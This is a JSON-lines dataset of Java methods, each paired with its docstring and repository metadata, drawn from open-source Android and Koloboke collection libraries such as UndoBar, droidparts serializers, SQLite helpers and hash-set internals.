{"docstring": "/**\n * Sets the message to be displayed on the left of the undo bar.\n */\n", "func_signal": "public Builder setMessage(CharSequence message)", "code": "{\n    mUndoMessage = message;\n    return this;\n}", "path": "library\\src\\main\\java\\com\\jensdriller\\libs\\undobar\\UndoBar.java", "repo_name": "jenzz/Android-UndoBar", "stars": 583, "license": "mit", "language": "java", "size": 856}
{"docstring": "/**\n * Called when the undo button is pressed.<br>\n * Hides the undo bar and notifies potential listener.\n */\n", "func_signal": "protected void onUndo()", "code": "{\n    hide(true);\n    safelyNotifyOnUndo();\n}", "path": "library\\src\\main\\java\\com\\jensdriller\\libs\\undobar\\UndoBar.java", "repo_name": "jenzz/Android-UndoBar", "stars": 583, "license": "mit", "language": "java", "size": 856}
{"docstring": "/**\n * Sets the text color resource id of the undo button.<br>\n * The default color is white.<br>\n * <b>Note:</b> This is only applied to the {@link UndoBar.Style#LOLLIPOP}\n * style and ignored otherwise.\n */\n", "func_signal": "public Builder setUndoColorResId(int undoColorResId)", "code": "{\n    mUndoColor = mWindow.getContext().getResources().getColor(undoColorResId);\n    return this;\n}", "path": "library\\src\\main\\java\\com\\jensdriller\\libs\\undobar\\UndoBar.java", "repo_name": "jenzz/Android-UndoBar", "stars": 583, "license": "mit", "language": "java", "size": 856}
{"docstring": "// JSON\n", "func_signal": "@SuppressWarnings(\"unchecked\")\npublic static FieldSpec<JSONAnn>[] getJSONSpecs(Class<? extends Model> cls)", "code": "{\n\tFieldSpec<JSONAnn>[] specs = JSON_SPECS.get(cls);\n\tif (specs == null) {\n\t\tArrayList<FieldSpec<JSONAnn>> list = new ArrayList<FieldSpec<JSONAnn>>();\n\t\tfor (Field field : getFieldHierarchy(cls)) {\n\t\t\tJSONAnn ann = getJSONAnn(field);\n\t\t\tif (ann != null) {\n\t\t\t\tann.key = getName(ann.key, field);\n\t\t\t\tlist.add(new FieldSpec<JSONAnn>(field, ann));\n\t\t\t}\n\t\t}\n\t\tspecs = list.toArray(new FieldSpec[list.size()]);\n\t\tJSON_SPECS.put(cls, specs);\n\t}\n\treturn specs;\n}", "path": "droidparts\\src\\org\\droidparts\\inner\\ClassSpecRegistry.java", "repo_name": "droidparts/droidparts", "stars": 780, "license": "apache-2.0", "language": "java", "size": 14767}
{"docstring": "//\n", "func_signal": "public static boolean isInstalled(Context ctx, String pkgName)", "code": "{\n\ttry {\n\t\tctx.getPackageManager().getApplicationInfo(pkgName, GET_META_DATA);\n\t\treturn true;\n\t} catch (NameNotFoundException e) {\n\t\treturn false;\n\t}\n}", "path": "droidparts-misc\\src\\org\\droidparts\\util\\AppUtils2.java", "repo_name": "droidparts/droidparts", "stars": 780, "license": "apache-2.0", "language": "java", "size": 14767}
{"docstring": "//\n", "func_signal": "public static void onFragmentCreateView(Object obj, View view, Dialog dialog, Bundle savedInstanceState)", "code": "{\n\tif (view != null) {\n\t\tInjector.inject(view, obj);\n\t} else if (dialog != null) {\n\t\tInjector.inject(dialog, obj);\n\t} else {\n\t\tthrow new IllegalArgumentException(\"Null View.\");\n\t}\n\tInstanceStateSaver.onCreate(obj, savedInstanceState);\n\tEventBus.registerAnnotatedReceiver(obj);\n}", "path": "droidparts\\src\\org\\droidparts\\inner\\delegate\\BaseDelegate.java", "repo_name": "droidparts/droidparts", "stars": 780, "license": "apache-2.0", "language": "java", "size": 14767}
{"docstring": "//\n", "func_signal": "private void testHttpBasicAuth(HTTPWorker worker) throws Exception", "code": "{\n\tRESTClient client;\n\tif (worker == null) {\n\t\tclient = new RESTClient(getActivity());\n\t} else {\n\t\tclient = new RESTClient(getActivity(), worker);\n\t}\n\ttestUnauthenticated(client);\n\ttestAuthenticatedWrongCredentials(client);\n\ttestAuthenticated(client);\n}", "path": "droidparts-test\\test\\org\\droidparts\\test\\testcase\\rest\\RESTClientAuthenticate.java", "repo_name": "droidparts/droidparts", "stars": 780, "license": "apache-2.0", "language": "java", "size": 14767}
{"docstring": "// SQL\n", "func_signal": "private static String getColumnName(ColumnAnn ann, Field field)", "code": "{\n\tString name = ann.name;\n\tif (isEmpty(name)) {\n\t\tname = field.getName();\n\t\tif (isEntity(field.getType()) && !name.endsWith(ID_AFFIX)) {\n\t\t\tname += ID_AFFIX;\n\t\t}\n\t}\n\treturn name;\n}", "path": "droidparts\\src\\org\\droidparts\\inner\\ClassSpecRegistry.java", "repo_name": "droidparts/droidparts", "stars": 780, "license": "apache-2.0", "language": "java", "size": 14767}
{"docstring": "// SavevInstanceState\n", "func_signal": "@SuppressWarnings(\"unchecked\")\npublic static FieldSpec<SaveInstanceStateAnn>[] getSaveInstanceSpecs(Class<?> cls)", "code": "{\n\tFieldSpec<SaveInstanceStateAnn>[] specs = SAVE_INSTANCE_SPECS.get(cls);\n\tif (specs == null) {\n\t\tArrayList<FieldSpec<SaveInstanceStateAnn>> list = new ArrayList<FieldSpec<SaveInstanceStateAnn>>();\n\t\tfor (Field field : getFieldHierarchy(cls)) {\n\t\t\tSaveInstanceStateAnn ann = getSaveInstanceStateAnn(field);\n\t\t\tif (ann != null) {\n\t\t\t\tlist.add(new FieldSpec<SaveInstanceStateAnn>(field, ann));\n\t\t\t}\n\t\t}\n\t\tspecs = list.toArray(new FieldSpec[list.size()]);\n\t\tSAVE_INSTANCE_SPECS.put(cls, specs);\n\t}\n\treturn specs;\n}", "path": "droidparts\\src\\org\\droidparts\\inner\\ClassSpecRegistry.java", "repo_name": "droidparts/droidparts", "stars": 780, "license": "apache-2.0", "language": "java", "size": 14767}
{"docstring": "// JSON & XML\n", "func_signal": "private static String getName(String name, Field field)", "code": "{\n\tif (isEmpty(name)) {\n\t\tname = field.getName();\n\t}\n\treturn name;\n}", "path": "droidparts\\src\\org\\droidparts\\inner\\ClassSpecRegistry.java", "repo_name": "droidparts/droidparts", "stars": 780, "license": "apache-2.0", "language": "java", "size": 14767}
{"docstring": "//\n", "func_signal": "@Override\npublic final void onCreate(SQLiteDatabase db)", "code": "{\n\tonOpen(db);\n\tonCreateTables(db);\n}", "path": "droidparts\\src\\org\\droidparts\\persist\\sql\\AbstractDBOpenHelper.java", "repo_name": "droidparts/droidparts", "stars": 780, "license": "apache-2.0", "language": "java", "size": 14767}
{"docstring": "//\n", "func_signal": "@Test\npublic void testCollections() throws Exception", "code": "{\n\tJSONSerializer<Collections> ser = makeSerializer(Collections.class);\n\tCollections coll = ser.deserialize(getJSONObject(R.raw.collections_json));\n\tassertEquals(2, coll.albumsArr.length);\n\tassertEquals(2, coll.albumsColl.size());\n\t//\n\tassertEquals(2, coll.map.size());\n\tassertTrue(coll.map.containsKey(2009));\n\tassertEquals(\"Iris\", coll.map.get(2009));\n\t//\n\tJSONObject obj = ser.serialize(coll);\n\tassertTrue(obj.has(\"map\"));\n}", "path": "droidparts-test\\test\\org\\droidparts\\test\\testcase\\serialize\\JSONTestCase.java", "repo_name": "droidparts/droidparts", "stars": 780, "license": "apache-2.0", "language": "java", "size": 14767}
{"docstring": "// CRUD methods\n", "func_signal": "public boolean create(EntityType item)", "code": "{\n\tcreateForeignKeys(item);\n\tContentValues cv = toContentValues(item);\n\tcv.remove(Column._ID);\n\tlong id = 0;\n\ttry {\n\t\tid = getDB().insertOrThrow(getTableName(), null, cv);\n\t} catch (SQLException e) {\n\t\tL.e(e.getMessage());\n\t\tL.d(e);\n\t}\n\tif (id > 0) {\n\t\titem._id = id;\n\t\treturn true;\n\t} else {\n\t\treturn false;\n\t}\n}", "path": "droidparts\\src\\org\\droidparts\\persist\\sql\\AbstractEntityManager.java", "repo_name": "droidparts/droidparts", "stars": 780, "license": "apache-2.0", "language": "java", "size": 14767}
{"docstring": "//\n", "func_signal": "private void readFromModelAndPutToJSON(ModelType item, FieldSpec<JSONAnn> spec, JSONObject obj, String key)\n\t\tthrows Exception", "code": "{\n\tPair<String, String> keyParts = getNestedKeyParts(key);\n\tif (keyParts != null) {\n\t\tString subKey = keyParts.first;\n\t\tJSONObject subObj;\n\t\tif (hasNonNull(obj, subKey)) {\n\t\t\tsubObj = obj.getJSONObject(subKey);\n\t\t} else {\n\t\t\tsubObj = new JSONObject();\n\t\t\tobj.put(subKey, subObj);\n\t\t}\n\t\treadFromModelAndPutToJSON(item, spec, subObj, keyParts.second);\n\t} else {\n\t\tObject val = getFieldVal(item, spec.field);\n\t\tputToJSON(obj, key, spec.ann.optional, spec.field.getType(), spec.genericArg1, spec.genericArg2, val);\n\t}\n}", "path": "droidparts\\src\\org\\droidparts\\persist\\serializer\\JSONSerializer.java", "repo_name": "droidparts/droidparts", "stars": 780, "license": "apache-2.0", "language": "java", "size": 14767}
{"docstring": "// Utils\n", "func_signal": "private static ArrayList<Field> getFieldHierarchy(Class<?> cls)", "code": "{\n\tArrayList<Field> list = new ArrayList<Field>();\n\tfor (Class<?> cl : buildClassHierarchy(cls)) {\n\t\tlist.addAll(Arrays.asList(cl.getDeclaredFields()));\n\t}\n\treturn list;\n}", "path": "droidparts\\src\\org\\droidparts\\inner\\ClassSpecRegistry.java", "repo_name": "droidparts/droidparts", "stars": 780, "license": "apache-2.0", "language": "java", "size": 14767}
{"docstring": "/**\n * null disables the icon\n */\n", "func_signal": "public void setIconLocation(Location loc)", "code": "{\n\tthis.loc = loc;\n\tinitIcon();\n}", "path": "droidparts-misc\\src\\org\\droidparts\\widget\\ClearableEditText.java", "repo_name": "droidparts/droidparts", "stars": 780, "license": "apache-2.0", "language": "java", "size": 14767}
{"docstring": "// helpers\n", "func_signal": "protected final boolean createIndex(SQLiteDatabase db, String table, boolean unique, String firstColumn,\n                                    String... otherColumns)", "code": "{\n\tArrayList<String> statements = new ArrayList<String>();\n\tstatements.add(PersistUtils.getCreateIndex(table, unique, firstColumn, otherColumns));\n\treturn executeStatements(db, statements);\n}", "path": "droidparts\\src\\org\\droidparts\\persist\\sql\\AbstractDBOpenHelper.java", "repo_name": "droidparts/droidparts", "stars": 780, "license": "apache-2.0", "language": "java", "size": 14767}
{"docstring": "// HttpClient\n", "func_signal": "@Override\npublic void addCookie(Cookie cookie)", "code": "{\n\tL.d(\"Got a cookie: %s.\", cookie);\n\tsynchronized (cookies) {\n\t\tfor (Iterator<Cookie> it = cookies.iterator(); it.hasNext(); ) {\n\t\t\tCookie c = it.next();\n\t\t\tif (isEqual(cookie, c)) {\n\t\t\t\tit.remove();\n\t\t\t}\n\t\t}\n\t}\n\tif (!cookie.isExpired(new Date())) {\n\t\tcookies.add(cookie);\n\t}\n\tif (persistCookies) {\n\t\tpersistCookies();\n\t}\n}", "path": "droidparts\\src\\org\\droidparts\\net\\http\\CookieJar.java", "repo_name": "droidparts/droidparts", "stars": 780, "license": "apache-2.0", "language": "java", "size": 14767}
{"docstring": "//\n", "func_signal": "public static void onActivityCreate(Activity activity, Bundle savedInstanceState)", "code": "{\n\tInjector.inject(activity);\n\tInstanceStateSaver.onCreate(activity, savedInstanceState);\n}", "path": "droidparts\\src\\org\\droidparts\\inner\\delegate\\BaseDelegate.java", "repo_name": "droidparts/droidparts", "stars": 780, "license": "apache-2.0", "language": "java", "size": 14767}
{"docstring": "//\n", "func_signal": "public <Result> Result executeInTransaction(Callable<Result> task)", "code": "{\n\ttry {\n\t\treturn PersistUtils.executeInTransaction(getDB(), task);\n\t} catch (Exception e) {\n\t\tL.e(e.getMessage());\n\t\tL.d(e);\n\t\treturn null;\n\t}\n}", "path": "droidparts\\src\\org\\droidparts\\persist\\sql\\AbstractEntityManager.java", "repo_name": "droidparts/droidparts", "stars": 780, "license": "apache-2.0", "language": "java", "size": 14767}
{"docstring": "//\n", "func_signal": "private void testPostMultipartFile(HTTPWorker worker) throws Exception", "code": "{\n\tRESTClient2 client = new RESTClient2(getActivity(), worker);\n\tFile file = writeTestFile(FILE_BODY);\n\t// Without content type\n\tHTTPResponse resp = client.postMultipart(URL, FILE_NAME, file);\n\tassertPostMultipartResponse(resp);\n\t// With content type\n\tresp = client.postMultipart(URL, FILE_NAME, CONTENT_TYPE, file);\n\tassertPostMultipartResponse(resp);\n}", "path": "droidparts-test\\test\\org\\droidparts\\test\\testcase\\rest\\RESTClientPostMultipart.java", "repo_name": "droidparts/droidparts", "stars": 780, "license": "apache-2.0", "language": "java", "size": 14767}
{"docstring": "// XML\n", "func_signal": "@SuppressWarnings(\"unchecked\")\npublic static FieldSpec<XMLAnn>[] getXMLSpecs(Class<? extends Model> cls)", "code": "{\n\tFieldSpec<XMLAnn>[] specs = XML_SPECS.get(cls);\n\tif (specs == null) {\n\t\tArrayList<FieldSpec<XMLAnn>> list = new ArrayList<FieldSpec<XMLAnn>>();\n\t\tfor (Field field : getFieldHierarchy(cls)) {\n\t\t\tXMLAnn ann = getXMLAnn(field);\n\t\t\tif (ann != null) {\n\t\t\t\tann.tag = getName(ann.tag, field);\n\t\t\t\tlist.add(new FieldSpec<XMLAnn>(field, ann));\n\t\t\t}\n\t\t}\n\t\tspecs = list.toArray(new FieldSpec[list.size()]);\n\t\tXML_SPECS.put(cls, specs);\n\t}\n\treturn specs;\n}", "path": "droidparts\\src\\org\\droidparts\\inner\\ClassSpecRegistry.java", "repo_name": "droidparts/droidparts", "stars": 780, "license": "apache-2.0", "language": "java", "size": 14767}
{"docstring": "// Inject\n", "func_signal": "@SuppressWarnings(\"unchecked\")\npublic static FieldSpec<InjectAnn<?>>[] getInjectSpecs(Class<?> cls)", "code": "{\n\tFieldSpec<InjectAnn<?>>[] specs = INJECT_SPECS.get(cls);\n\tif (specs == null) {\n\t\tArrayList<FieldSpec<InjectAnn<?>>> list = new ArrayList<FieldSpec<InjectAnn<?>>>();\n\t\tfor (Field field : getFieldHierarchy(cls)) {\n\t\t\tInjectAnn<?> ann = getInjectAnn(field);\n\t\t\tif (ann != null) {\n\t\t\t\tlist.add(new FieldSpec<InjectAnn<?>>(field, ann));\n\t\t\t}\n\t\t}\n\t\tspecs = list.toArray(new FieldSpec[list.size()]);\n\t\tINJECT_SPECS.put(cls, specs);\n\t}\n\treturn specs;\n}", "path": "droidparts\\src\\org\\droidparts\\inner\\ClassSpecRegistry.java", "repo_name": "droidparts/droidparts", "stars": 780, "license": "apache-2.0", "language": "java", "size": 14767}
{"docstring": "/**\n * Empties the hash.\n */\n", "func_signal": "@Override\npublic void clear()", "code": "{\n    /* if true concurrentModificationChecked */modCount++;/* endif */\n    size = 0;\n}", "path": "lib\\impl\\src\\main\\javaTemplates\\com\\koloboke\\collect\\impl\\hash\\MutableLHash.java", "repo_name": "leventov/Koloboke", "stars": 980, "license": "None", "language": "java", "size": 39039}
{"docstring": "/////////////////////////////\n// Modification hooks and rehash logic\n", "func_signal": "@Override\npublic boolean shrink()", "code": "{\n    int newCapacity = targetCapacity(size);\n    if (newCapacity < capacity()) {\n        rehash(newCapacity);\n        return true;\n    } else {\n        return false;\n    }\n}", "path": "lib\\impl\\src\\main\\javaTemplates\\com\\koloboke\\collect\\impl\\hash\\MutableLHash.java", "repo_name": "leventov/Koloboke", "stars": 980, "license": "None", "language": "java", "size": 39039}
{"docstring": "/**\n * Indicates that the annotated method should be overridden in the Koloboke Compile-generated\n * implementation of the containing type, based on the method form having parameter and return\n * types of the annotated method and name, specified by this annotation. {@code @MethodForm}\n * effectively just alters the method form matching algorithm (see description in the specification\n * of <a href=\"{@docRoot}/com/koloboke/compile/KolobokeMap.html#method-form-matching\">\n * {@code @KolobokeMap}</a> or\n * <a href=\"{@docRoot}/com/koloboke/compile/KolobokeSet.html#set-method-form-matching\">\n * {@code @KolobokeSet}</a>).\n *\n * <p>Most commonly this annotation could be used to decorate Koloboke Compile-generated methods,\n * e. g. synchronize them, make extra argument checks, etc. In subclasses, this is as simple as\n * overriding a method and calling {@code super.methodName()} in the body, but since the implemented\n * type is a supertype of the Koloboke Compile-generated class, and non-abstract methods in the\n * implemented type <i>underride</i> methods in the generated class, decoration is a little more\n * complicated:<pre><code>\n * &#064;KolobokeMap\n * public abstract class SynchronizedMap&lt;K, V&gt; {\n *     public static &lt;K, V&gt; SynchronizedMap&lt;K, V&gt; withExpectedSize(int expectedSize) {\n *         return new KolobokeSynchronizedMap&lt;K, V&gt;(expectedSize);\n *     }\n *\n *     public final synchronized V get(K key) {\n *         return subGet(key);\n *     }\n *\n *     public final synchronized V put(K key, V value) {\n *         return subPut(key, value);\n *     }\n *\n *     public final synchronized int size() {\n *         return subSize();\n *     }\n *\n *     &#064;MethodForm(\"get\")\n *     abstract V subGet(K key);\n *\n *     &#064;MethodForm(\"put\")\n *     abstract V subPut(K key, V value);\n *\n *     &#064;MethodForm(\"size\")\n *     abstract int subSize();\n * }</code></pre>\n *\n * <p>Only abstract methods could be annotated with {@code @MethodForm} (i. e. they must be\n * implemented by Koloboke Compile, not the user). If several abstract methods in a\n * {@code @KolobokeMap}- or {@code @KolobokeSet}-annotated type have equivalent parameter types and\n * have same method form name (either specified by {@code @MethodForm} or in the absence of this\n * annotation, equal to the method name), Koloboke Compile emits a compilation error message and\n * doesn't generate an implementation for such type.\n *\n * <p>By default, if there are usages (calls or method references) in the Koloboke Compile-generated\n * implementation class of the method with the name, specified by this {@code @MethodForm}\n * annotation, and parameter types of the annotated method, Koloboke Compile replaces usages of this\n * method with the annotated method. If {@link #replaceUsages()} is {@code false}, Koloboke Compile\n * doesn't perform this forwarding, and the implementation methods may call the decorated method\n * implementation.\n *\n * <p>The annotated method could have any name, but it's own signature (without the\n * {@code @MethodForm} annotation) shouldn't <a\n * href=\"{@docRoot}/com/koloboke/compile/KolobokeMap.html#method-form-matching\">match</a> another\n * method form.\n */\n", "func_signal": "@Retention(RetentionPolicy.CLASS)\n@Target(ElementType.METHOD)\npublic @interface MethodForm", "code": "{\n\n    /**\n     * The name of the method form, that Koloboke Compile should implement in the overriding method,\n     * different from the name of the annotated method.\n     *\n     * @return name of the method form, that Koloboke Compile should implement in the overriding\n     * method\n     */\n    String value();\n\n    /**\n     * Tells whether usages (calls or method references) in the Koloboke Compile-generated\n     * implementation class of the method with the name, specified by this {@code @MethodForm}\n     * annotation, and parameter types of the annotated method, should be replaced with usages of\n     * the annotated method or not. Only usages, which statically resolve to the prototype method,\n     * i. e. where the type of the method call receiver is the implemented type or the generated\n     * implementation type, but not a supertype of the implemented type, are replaced.\n     *\n     * <p>If {@code replaceUsages} is configured to {@code false} and usages are not replaced, the\n     * same risks as <a href=\"{@docRoot}/com/koloboke/compile/KolobokeMap.html#underriding-warning\">\n     * with usual method underriding</a> appear.\n     *\n     * @return {@code true} if Koloboke Compile should replace usages of the method form prototype\n     * methods in the generated implementation with the {@code @MethodForm}-annotated method\n     */\n    boolean replaceUsages() default true;\n}", "path": "compile\\src\\main\\java\\com\\koloboke\\compile\\MethodForm.java", "repo_name": "leventov/Koloboke", "stars": 980, "license": "None", "language": "java", "size": 39039}
{"docstring": "/**\n * Apply this method to both cursors and return normally only if both\n * produce the same response.\n *\n * @see Stimulus#executeAndCompare(ObjCursor, Cursor)\n */\n", "func_signal": "private void internalExecuteAndCompare(\n        Cursor reference, C target, CursorOperation method) throws AssertionFailedError", "code": "{\n\n    Object referenceReturnValue = null;\n    Set<Class<? extends RuntimeException>> possibleExceptionClasses = null;\n    Object targetReturnValue = null;\n    RuntimeException targetException = null;\n\n    try {\n        targetReturnValue = method.execute(target);\n    } catch (RuntimeException e) {\n        targetException = e;\n    }\n\n    try {\n        if (method == MOVE_NEXT_METHOD && targetException == null &&\n                knownOrder == CursorKnownOrder.UNKNOWN_ORDER) {\n            try {\n                ((MultiExceptionCursor) reference).promoteToNext(current(target));\n            } catch (IllegalStateException e) {\n                // do nothing, reference should also throw IllegalStateException,\n                // this will be checked in the subsequent\n                // internalExecuteAndCompare(reference, target, CURRENT_METHOD) call\n            }\n        }\n\n        if (method == FOR_EACH_FORWARD_METHOD && targetException == null &&\n                knownOrder == CursorKnownOrder.UNKNOWN_ORDER) {\n            List<E> elements = (List<E>) targetReturnValue;\n            Lists.reverse(elements).forEach(((MultiExceptionCursor) reference)::promoteToNext);\n        }\n\n        referenceReturnValue = method.execute(reference);\n        if (referenceReturnValue instanceof Set)\n            possibleExceptionClasses =\n                    (Set<Class<? extends RuntimeException>>) referenceReturnValue;\n    } catch (UnknownElementException e) {\n        Util.fail(e, e.getMessage());\n    }\n\n    if (possibleExceptionClasses == null) {\n        if (targetException != null) {\n            Util.fail(targetException, \"Target threw exception when reference did not\");\n        }\n\n        assertEquals(referenceReturnValue, targetReturnValue);\n        return;\n    }\n\n    if (targetException == null) {\n        fail(\"Target failed to throw one of \" + possibleExceptionClasses);\n    }\n\n    assertPermitted(possibleExceptionClasses, targetException);\n}", "path": "lib\\testing\\src\\main\\javaTemplates\\com\\koloboke\\collect\\testing\\AbstractCursorTester.java", "repo_name": "leventov/Koloboke", "stars": 980, "license": "None", "language": "java", "size": 39039}
{"docstring": "/**\n * @return an array of the proper size with {@code null} inserted into the\n * middle element.\n */\n", "func_signal": "protected Character[] createArrayWithSpecialElement()", "code": "{\n    Character[] array = createSamplesArray();\n    array[getNullLocation()] = special();\n    return array;\n}", "path": "lib\\testing\\src\\main\\javaTemplates\\com\\koloboke\\collect\\testing\\AbstractCharCollectionTester.java", "repo_name": "leventov/Koloboke", "stars": 980, "license": "None", "language": "java", "size": 39039}
{"docstring": "// GWT compiler warning; see contains().\n", "func_signal": "@SuppressWarnings(\"cast\")\n@Override\npublic boolean remove(Object object)", "code": "{\n    if (object instanceof Multiset.Entry) {\n        Entry<?> entry = (Entry<?>) object;\n        Object element = entry.getElement();\n        int entryCount = entry.getCount();\n        if (entryCount != 0) {\n            // Safe as long as we never add a new entry, which we won't.\n            @SuppressWarnings(\"unchecked\")\n            Multiset<Object> multiset = (Multiset) KolobokeMapBackedMultiset.this;\n            return multiset.setCount(element, entryCount, 0);\n        }\n    }\n    return false;\n}", "path": "compile\\src\\test\\java\\com\\koloboke\\compile\\KolobokeMapBackedMultiset.java", "repo_name": "leventov/Koloboke", "stars": 980, "license": "None", "language": "java", "size": 39039}
{"docstring": "/* endwith */\n", "func_signal": "@SuppressWarnings(\"unchecked\")\n@Override\n@Nonnull\npublic HashObjSetFactory<E> withEquivalence(@Nonnull Equivalence<? super E> equivalence)", "code": "{\n    if (equivalence.equals(Equivalence.defaultEquality()))\n        return new DHashObjSetFactoryImpl<E>(/* commonArgGet */);\n    if (this.equivalence.equals(equivalence)) {\n        return (HashObjSetFactory<E>) this;\n    }\n    return new WithCustomEquivalence<E>(/* commonArgGet */, (Equivalence<E>) equivalence);\n}", "path": "lib\\impl\\src\\main\\javaTemplates\\com\\koloboke\\collect\\impl\\hash\\DHashObjSetFactoryImpl.java", "repo_name": "leventov/Koloboke", "stars": 980, "license": "None", "language": "java", "size": 39039}
{"docstring": "/* with No|Some removed */\n", "func_signal": "@CollectionFeature.Require(SUPPORTS_REMOVE)\npublic void testRemoveIf_iteratorOrder_noRemoved()", "code": "{\n    /* if Some removed */remove();/* endif */\n    List<Character> iteratorElements = new ArrayList<>();\n    for (Character element : c()) { // uses iterator()\n        iteratorElements.add(element);\n    }\n    List<Character> removeIfElements = new ArrayList<>();\n    /*f*/CharPredicate collectAndReturnFalse = c -> {\n        removeIfElements.add(c);\n        return false;\n    };\n    c().removeIf(collectAndReturnFalse);\n    assertEquals(\"removeIf() order is different from iteration order\",\n            iteratorElements, removeIfElements);\n    expectContents(noRemoved(getOrderedElements()));\n}", "path": "lib\\testing\\src\\main\\javaTemplates\\com\\koloboke\\collect\\testing\\testers\\CharCollectionRemoveIfTester.java", "repo_name": "leventov/Koloboke", "stars": 980, "license": "None", "language": "java", "size": 39039}
{"docstring": "/* endif */\n", "func_signal": "@CollectionFeature.Require(SUPPORTS_REMOVE)\n    public void testRemoveIf_removeNothing_noRemoved()", "code": "{\n        /* if Some removed */remove();/* endif */\n        /*f*/CharPredicate alwaysFalse = c -> false;\n        assertFalse(\"removeIf() which don't remove anything should return false\",\n                c().removeIf(alwaysFalse));\n        expectContents(noRemoved(getOrderedElements()));\n    }", "path": "lib\\testing\\src\\main\\javaTemplates\\com\\koloboke\\collect\\testing\\testers\\CharCollectionRemoveIfTester.java", "repo_name": "leventov/Koloboke", "stars": 980, "license": "None", "language": "java", "size": 39039}
{"docstring": "// creating array of generic class Stimulus\n", "func_signal": "protected AbstractCursorTester(int steps, Iterable<CursorFeature> features,\n           Iterable<E> expectedElements, CursorKnownOrder knownOrder, int startIndex,\n           boolean mapCursor)", "code": "{\n       stimuli = new Stimulus[steps];\n       this.features = Helpers.copyToSet(features);\n       this.expectedElements = Helpers.copyToList(expectedElements);\n       this.knownOrder = knownOrder;\n       this.startIndex = startIndex;\n       current = new Stimulus<E, Cursor>(mapCursor ? \"key, value\" : \"elem\") {\n           @Override\n           void executeAndCompare(ObjCursor<E> reference, Cursor target) {\n               internalExecuteAndCompare(reference, (C) target, CURRENT_METHOD);\n           }\n       };\n   }", "path": "lib\\testing\\src\\main\\javaTemplates\\com\\koloboke\\collect\\testing\\AbstractCursorTester.java", "repo_name": "leventov/Koloboke", "stars": 980, "license": "None", "language": "java", "size": 39039}
{"docstring": "/**\n * Copy of {@link com.google.common.collect.testing.Helpers#fail(Throwable, Object)}\n */\n", "func_signal": "public static void fail(Throwable cause, Object message)", "code": "{\n    AssertionFailedError assertionFailedError =\n            new AssertionFailedError(String.valueOf(message));\n    assertionFailedError.initCause(cause);\n    throw assertionFailedError;\n}", "path": "lib\\testing\\src\\main\\java\\com\\koloboke\\collect\\testing\\Util.java", "repo_name": "leventov/Koloboke", "stars": 980, "license": "None", "language": "java", "size": 39039}
{"docstring": "//* if !(obj value) //(char)// endif *//* enddefine */\n", "func_signal": "@Test\n    public void testGetByEqualButNotIdenticalKey()", "code": "{\n        Map<Integer, /*valueType*/Character/**/> map = HashObjCharMaps.newMutableMap(10);\n        int val1 = 1024*1024;\n        int val2 = 1024*1024 + 1;\n        int val3 = 1024*1024 + 2;\n        int val4 = 1024*1024 + 3;\n        map.put(val1, /*valuePrimCast*/(char)/**/ val1);\n        map.put(val2, /*valuePrimCast*/(char)/**/ val2);\n        map.put(val3, /*valuePrimCast*/(char)/**/ val3);\n        map.put(val4, /*valuePrimCast*/(char)/**/ val4);\n\n        assertEquals((/*valueType*/Character/**/) /*valuePrimCast*/(char)/**/ val1, map.get(val1));\n        assertEquals((/*valueType*/Character/**/) /*valuePrimCast*/(char)/**/ val2, map.get(val2));\n        assertEquals((/*valueType*/Character/**/) /*valuePrimCast*/(char)/**/ val3, map.get(val3));\n        assertEquals((/*valueType*/Character/**/) /*valuePrimCast*/(char)/**/ val4, map.get(val4));\n    }", "path": "lib\\impl\\src\\test\\javaTemplates\\com\\koloboke\\collect\\map\\hash\\ObjCharMapTest.java", "repo_name": "leventov/Koloboke", "stars": 980, "license": "None", "language": "java", "size": 39039}
{"docstring": "/* endif */\n", "func_signal": "private short specializedGet(Character key)", "code": "{\n    return getMap().get/* if obj key //$Short// endif */(\n            key/* if !(obj key) */.charValue()/* endif */\n    );\n}", "path": "lib\\testing\\src\\main\\javaTemplates\\com\\koloboke\\collect\\testing\\map\\testers\\CharShortMapGetTester.java", "repo_name": "leventov/Koloboke", "stars": 980, "license": "None", "language": "java", "size": 39039}
{"docstring": "/* endif */\n", "func_signal": "@CollectionFeature.Require(SUPPORTS_REMOVE)\n    public void testRemoveIf_removeAll_noRemoved()", "code": "{\n        /* if Some removed */remove();/* endif */\n        /*f*/CharPredicate alwaysTrue = c -> true;\n        boolean shouldRemove = !c().isEmpty();\n        assertEquals(shouldRemove, c().removeIf(alwaysTrue));\n        expectContents();\n        expectMissing(samples.e0(), samples.e1(), samples.e2());\n    }", "path": "lib\\testing\\src\\main\\javaTemplates\\com\\koloboke\\collect\\testing\\testers\\CharCollectionRemoveIfTester.java", "repo_name": "leventov/Koloboke", "stars": 980, "license": "None", "language": "java", "size": 39039}
{"docstring": "/* with Mutable|Updatable mutability */\n", "func_signal": "@Override\n@Nonnull\npublic MutableDHashByteSetGO newMutableSet(int expectedSize)", "code": "{\n    /* if float|double elem */\n    MutableDHashByteSetGO set = new MutableDHashByteSet();\n    set.init(configWrapper, expectedSize);\n    return set;\n    /* elif !(float|double elem) && !(LHash hash) && Mutable mutability */\n    return newMutableHash(expectedSize);\n    /* elif LHash hash || Updatable mutability */\n    MutableDHashByteSetGO set = new MutableDHashByteSet();\n    set.init(configWrapper, expectedSize, getFree());\n    return set;\n    /* endif */\n}", "path": "lib\\impl\\src\\main\\javaTemplates\\com\\koloboke\\collect\\impl\\hash\\DHashByteSetFactorySO.java", "repo_name": "leventov/Koloboke", "stars": 980, "license": "None", "language": "java", "size": 39039}
{"docstring": "/* endif */\n", "func_signal": "public void testGet_specialNotContainedButAllowed()", "code": "{\n        assertDefaultValue(\"get(\" + specialKey() + \") should return \" + defaultValue(),\n                specializedGet(specialKey()));\n    }", "path": "lib\\testing\\src\\main\\javaTemplates\\com\\koloboke\\collect\\testing\\map\\testers\\CharShortMapGetTester.java", "repo_name": "leventov/Koloboke", "stars": 980, "license": "None", "language": "java", "size": 39039}
{"docstring": "/**\n * Executes the test.\n */\n", "func_signal": "public final void test()", "code": "{\n    try {\n        recurse(0);\n    } catch (RuntimeException e) {\n        throw new RuntimeException(Arrays.toString(stimuli), e);\n    }\n}", "path": "lib\\testing\\src\\main\\javaTemplates\\com\\koloboke\\collect\\testing\\AbstractCursorTester.java", "repo_name": "leventov/Koloboke", "stars": 980, "license": "None", "language": "java", "size": 39039}
